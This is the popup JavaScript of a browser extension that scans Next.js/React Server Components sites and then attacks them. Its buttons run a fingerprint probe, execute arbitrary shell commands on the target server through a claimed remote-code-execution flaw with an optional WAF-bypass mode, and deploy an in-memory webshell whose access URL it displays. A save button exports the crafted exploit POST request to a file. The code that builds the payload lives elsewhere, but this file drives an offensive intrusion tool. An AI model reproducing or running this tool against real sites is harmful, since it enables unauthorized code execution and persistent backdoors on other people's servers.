document.addEventListener('DOMContentLoaded', () => {
    // Use browser API for Firefox compatibility
    const browserAPI = typeof browser !== 'undefined' ? browser : chrome;

    const el = {
        passiveBadge: document.getElementById('passive-badge'),
        passiveList: document.getElementById('passive-list'),
        btnFinger: document.getElementById('btnFingerprint'),
        fingerResult: document.getElementById('fingerprint-result'),
        activeList: document.getElementById('active-list'),
        btnExploit: document.getElementById('btnExploit'),
        cmdInput: document.getElementById('cmdInput'),
        wafToggle: document.getElementById('wafToggle'),
        exploitStatus: document.getElementById('exploit-status'),
        exploitResult: document.getElementById('exploit-result'),
        rceOutput: document.getElementById('rce-output'),
        serverLog: document.getElementById('server-log'),
        serverStatus: document.getElementById('server-status'),
        serverTitle: document.getElementById('server-title'),
        btnSaveRequest: document.getElementById('btnSaveRequest'),
        btnMemoryShell: document.getElementById('btnMemoryShell'),
        memoryShellResult: document.getElementById('memory-shell-result'),
        memoryShellOutput: document.getElementById('memory-shell-output')
    };

    // Store request data for saving
    let lastRequestData = null;

    // WAF Toggle durumunu localStorage'dan yükle
    const savedWafState = localStorage.getItem('wafBypassEnabled');
    if (savedWafState !== null) {
        el.wafToggle.checked = savedWafState === 'true';
    } else {
        // İlk kullanımda varsayılan olarak kapalı
        el.wafToggle.checked = false;
    }

    // WAF Toggle değiştiğinde localStorage'a kaydet
    el.wafToggle.addEventListener('change', () => {
        const isEnabled = el.wafToggle.checked;
        localStorage.setItem('wafBypassEnabled', isEnabled.toString());
        console.log('[Popup] WAF Toggle changed, saved:', isEnabled);
    });

    // 1. 获取当前 Tab
    browserAPI.tabs.query({ active: true, currentWindow: true }, (tabs) => {
        const tabId = tabs[0].id;

        // --- 初始化：被动扫描 ---
        browserAPI.tabs.sendMessage(tabId, { action: "get_passive" }, (res) => {
            if (browserAPI.runtime.lastError || !res) {
                el.passiveBadge.innerText = "ERROR";
                el.passiveBadge.className = "status-indicator detected";
                el.passiveList.innerHTML = "<li>Please refresh page</li>";
                return;
            }
            if (res.isRSC) {
                el.passiveBadge.innerText = "DETECTED";
                el.passiveBadge.className = "status-indicator detected";
            } else {
                el.passiveBadge.innerText = "SAFE";
                el.passiveBadge.className = "status-indicator safe";
            }

            el.passiveList.innerHTML = "";
            if (res.details.length === 0) el.passiveList.innerHTML = "<li>No patterns found</li>";
            res.details.forEach(d => {
                const li = document.createElement('li');
                li.innerText = d;
                el.passiveList.appendChild(li);
            });
        });

        // --- 交互：主动指纹 ---
        el.btnFinger.addEventListener('click', () => {
            el.btnFinger.disabled = true;
            el.btnFinger.innerText = "Probing...";
            el.fingerResult.style.display = 'none';

            browserAPI.tabs.sendMessage(tabId, { action: "run_fingerprint" }, (res) => {
                el.btnFinger.disabled = false;
                el.btnFinger.innerText = "Start Fingerprint Probe";
                el.fingerResult.style.display = 'block';
                el.activeList.innerHTML = "";

                if (res && res.detected) {
                    res.details.forEach(d => {
                        const li = document.createElement('li');
                        li.innerText = d;
                        el.activeList.appendChild(li);
                    });
                } else {
                    el.activeList.innerHTML = "<li>No Active RSC Response</li>";
                }
            });
        });

        // --- 交互：RCE 利用 ---
        el.btnExploit.addEventListener('click', () => {
            const cmd = el.cmdInput.value || "whoami";
            // WAF toggle durumunu STRICT olarak kontrol et
            const wafEnabled = el.wafToggle && el.wafToggle.checked === true;
            console.log('[Popup] WAF Toggle element:', el.wafToggle);
            console.log('[Popup] WAF Toggle checked value:', el.wafToggle ? el.wafToggle.checked : 'N/A');
            console.log('[Popup] WAF Enabled (final):', wafEnabled);
            el.btnExploit.disabled = true;
            el.exploitStatus.style.display = 'block';
            el.exploitResult.style.display = 'none';
            el.rceOutput.className = 'console-output'; // 重置样式

            browserAPI.tabs.sendMessage(tabId, {
                action: "run_exploit",
                cmd: cmd,
                wafEnabled: wafEnabled
            }, (res) => {
                console.log('[Popup] Received response:', res);
                console.log('[Popup] Response statusCode:', res ? res.statusCode : 'N/A');
                console.log('[Popup] Response title:', res ? res.title : 'N/A');

                el.btnExploit.disabled = false;
                el.exploitStatus.style.display = 'none';
                el.exploitResult.style.display = 'block';
                el.serverLog.style.display = 'block';

                // Helper to update Save button
                const updateSaveBtn = () => {
                    if (lastRequestData) {
                        el.btnSaveRequest.disabled = false;
                        el.btnSaveRequest.textContent = 'Save Request';
                    }
                };

                // Store request data from response (if available)
                if (res && res.requestData) {
                    lastRequestData = res.requestData;
                    console.log('[Popup] Request data stored:', lastRequestData);
                    updateSaveBtn();
                } else {
                    // Fallback: try to get request data from content script
                    browserAPI.tabs.sendMessage(tabId, {
                        action: "get_last_request"
                    }, (requestData) => {
                        if (requestData && !browserAPI.runtime.lastError) {
                            lastRequestData = requestData;
                            console.log('[Popup] Request data retrieved from content script:', lastRequestData);
                            updateSaveBtn();
                        }
                    });
                }

                // Update server log - her zaman status code ve title'ı göster
                if (res) {
                    const statusCode = res.statusCode;
                    if (statusCode !== null && statusCode !== undefined && statusCode !== '') {
                        el.serverStatus.textContent = statusCode;
                        // Remove old classes
                        el.serverStatus.className = 'server-info-value';
                        // Add status class
                        if (statusCode >= 200 && statusCode < 300) {
                            el.serverStatus.classList.add('status-2xx');
                        } else if (statusCode >= 400 && statusCode < 500) {
                            el.serverStatus.classList.add('status-4xx');
                        } else if (statusCode >= 500) {
                            el.serverStatus.classList.add('status-5xx');
                        }
                    } else {
                        el.serverStatus.textContent = 'N/A';
                        el.serverStatus.className = 'server-info-value';
                    }

                    if (res.title && res.title !== '-') {
                        el.serverTitle.textContent = res.title;
                    } else {
                        el.serverTitle.textContent = '-';
                    }
                } else {
                    el.serverStatus.textContent = 'N/A';
                    el.serverStatus.className = 'server-info-value';
                    el.serverTitle.textContent = '-';
                }

                if (res && res.success) {
                    el.rceOutput.className = 'console-output';
                    el.rceOutput.innerText = `[+] Command: ${cmd}\n[+] WAF Bypass: ${wafEnabled ? 'ON' : 'OFF'}\n[+] Output:\n${res.output}`;
                    // 成功后强制图标报警
                    browserAPI.runtime.sendMessage({ action: "update_badge" });
                } else {
                    el.rceOutput.className = 'console-output error';
                    el.rceOutput.innerText = `[-] ${res ? res.msg : "Unknown Error"}`;
                }
            });
        });

        // --- Memory Shell Button ---
        el.btnMemoryShell.addEventListener('click', () => {
            // WAF toggle durumunu kontrol et
            const wafEnabled = el.wafToggle && el.wafToggle.checked === true;
            console.log('[Popup] Memory Shell - WAF Toggle checked:', wafEnabled);
            
            el.btnMemoryShell.disabled = true;
            el.btnMemoryShell.textContent = "Deploying...";
            el.memoryShellResult.style.display = 'none';
            el.memoryShellOutput.className = 'console-output';

            browserAPI.tabs.sendMessage(tabId, {
                action: "deploy_memory_shell",
                wafEnabled: wafEnabled
            }, (res) => {
                el.btnMemoryShell.disabled = false;
                el.btnMemoryShell.textContent = "Memory Shell";
                el.memoryShellResult.style.display = 'block';

                if (browserAPI.runtime.lastError) {
                    console.error('[Popup] Runtime error:', browserAPI.runtime.lastError);
                    el.memoryShellOutput.className = 'console-output error';
                    el.memoryShellOutput.innerText = `[-] Runtime Error: ${browserAPI.runtime.lastError.message}`;
                    return;
                }

                if (res && res.success) {
                    el.memoryShellOutput.className = 'console-output';
                    let successMsg = `[+] SUCCESS\n[+] Memory Shell Path: ${res.shellPath}\n[+] Access: ${res.fullUrl}`;
                    if (wafEnabled) {
                        successMsg += `\n[+] WAF Bypass: ON`;
                    }
                    if (res.message) {
                        successMsg += `\n[+] Response: ${res.message}`;
                    }
                    if (res.note) {
                        successMsg += `\n[!] Note: ${res.note}`;
                    }
                    el.memoryShellOutput.innerText = successMsg;
                } else {
                    el.memoryShellOutput.className = 'console-output error';
                    console.log('[Popup] Error response:', res);
                    el.memoryShellOutput.innerText = `[-] ${res ? (res.msg || "Unknown Error") : "No response received"}`;
                }
            });
        });

        // --- Save Request Button ---
        el.btnSaveRequest.addEventListener('click', () => {
            if (!lastRequestData) {
                // Try to get request data from content script
                browserAPI.tabs.sendMessage(tabId, {
                    action: "get_last_request"
                }, (requestData) => {
                    if (requestData && !browserAPI.runtime.lastError && requestData.url) {
                        lastRequestData = requestData;
                        saveRequestToFile(lastRequestData);
                    } else {
                        alert('No request data available. Please send a request first.');
                    }
                });
            } else if (lastRequestData.url) {
                saveRequestToFile(lastRequestData);
            } else {
                alert('No request data available. Please send a request first.');
            }
        });

        // Function to save request to file
        function saveRequestToFile(requestData) {
            try {
                // Get current tab URL to extract domain
                browserAPI.tabs.query({ active: true, currentWindow: true }, (tabs) => {
                    if (tabs && tabs[0]) {
                        const url = new URL(tabs[0].url);
                        const domain = url.hostname.replace(/\./g, '_');
                        const filename = `request_${domain}.txt`;

                        // Format request data
                        let requestText = `POST ${requestData.url} HTTP/1.1\n`;
                        requestText += `Host: ${url.hostname}\n`;
                        requestText += `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0\n`;
                        requestText += `Next-Action: x\n`;
                        requestText += `X-Nextjs-Request-Id: b5dce965\n`;
                        requestText += `Content-Type: multipart/form-data; boundary=${requestData.boundary}\n`;
                        requestText += `X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9\n`;
                        requestText += `Content-Length: ${requestData.bodyLength}\n`;
                        requestText += `\n`;
                        requestText += requestData.body;

                        // Create blob
                        const blob = new Blob([requestText], { type: 'text/plain' });
                        const blobUrl = URL.createObjectURL(blob);

                        // Helper for fallback download
                        const downloadWithAnchor = () => {
                            console.log('Attempting fallback download via anchor tag...');
                            try {
                                const a = document.createElement('a');
                                a.href = blobUrl;
                                a.download = filename;
                                document.body.appendChild(a);
                                a.click();
                                document.body.removeChild(a);

                                // Clean up blob URL after a delay
                                setTimeout(() => URL.revokeObjectURL(blobUrl), 5000);
                            } catch (err) {
                                console.error('Fallback download failed:', err);
                                alert('Failed to save request file: ' + err.message);
                            }
                        };

                        // Try downloads API first
                        if (browserAPI.downloads) {
                            browserAPI.downloads.download({
                                url: blobUrl,
                                filename: filename,
                                saveAs: false
                            }, (downloadId) => {
                                if (browserAPI.runtime.lastError || !downloadId) {
                                    console.error('Download API error:', browserAPI.runtime.lastError);
                                    // If API fails, try fallback
                                    downloadWithAnchor();
                                } else {
                                    console.log('Request saved via API:', filename);
                                    setTimeout(() => URL.revokeObjectURL(blobUrl), 5000);
                                }
                            });
                        } else {
                            // If API not available, use fallback immediately
                            downloadWithAnchor();
                        }
                    } else {
                        alert('Error: Could not find active tab to generate filename.');
                    }
                });
            } catch (e) {
                console.error('Error saving request:', e);
                alert('Failed to save request: ' + e.message);
            }
        }
    });
});
